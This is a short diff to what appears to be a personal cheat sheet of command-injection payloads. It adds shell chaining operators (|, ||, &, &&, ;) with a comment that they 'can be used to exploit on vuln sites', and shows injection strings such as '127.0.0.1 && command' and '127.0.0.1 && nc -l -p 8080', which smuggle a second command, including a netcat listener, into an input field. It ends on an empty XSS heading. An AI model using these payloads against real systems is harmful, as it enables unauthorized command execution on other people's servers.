@@ -12,6 +12,14 @@ echo Injected| #perl
 127.0.0.1 && command
 
 ||  #
+|
+||
+&
+&&
+;
+#all of these are AND operators; can be used to exploit on vuln sites that allow commands to be run
 
 #is nc on the system? stuff can be done with that
 127.0.0.1 && nc -l -p 8080
+
+####xss####
